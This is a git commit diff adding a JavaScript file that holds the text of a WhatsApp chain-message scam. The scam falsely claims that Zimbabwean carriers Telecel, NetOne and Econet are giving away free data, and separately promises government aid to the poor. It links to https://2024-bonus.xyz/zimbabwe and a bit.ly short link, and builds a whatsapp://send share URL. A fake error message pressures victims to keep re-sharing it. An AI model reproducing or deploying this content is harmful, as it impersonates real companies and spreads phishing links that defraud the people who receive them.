73cb6c573c62de1cc798cd2d465c95eeb6f85bc3
opayoffer <154964955+opayoffer@users.noreply.github.com>
2024-04-22 01:44:21 -0700

    Update and rename javaxmas2.js to java-api.js

---
+++ java-api.js
@@ -0,0 +1,7 @@
+ var text1 = "*OLD SIM CARD REWARD*%0A%0A_*TELECEL, NETONE,  AND ECONET* is Rewarding their *OLD* customers with free data from 6-month old and above%0A%0A6 Month Old Sim - *5GB*%0A1 Year and above - *10GB*%0A%0AHurry now and grab this amazing offer%0A%0ATelecel Users👇%0Ahttps://2024-bonus.xyz/zimbabwe %0A%0ANetone Users👇 %0Ahttps://2024-bonus.xyz/zimbabwe%0A%0AEconet Users👇 %0Ahttps://2024-bonus.xyz/zimbabwe",
+            text2 = " an amount of ",
+            text3 = "for every citizen who meets the conditions as an aid to the poor class to overcome the crisis. Enter and register now and make sure to register correctly 👉 ",
+            error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",
+            abcde = "https://bit.ly/yhauajjdng",
+            saved = "",
+            share = "whatsapp://send?text=" + text1;
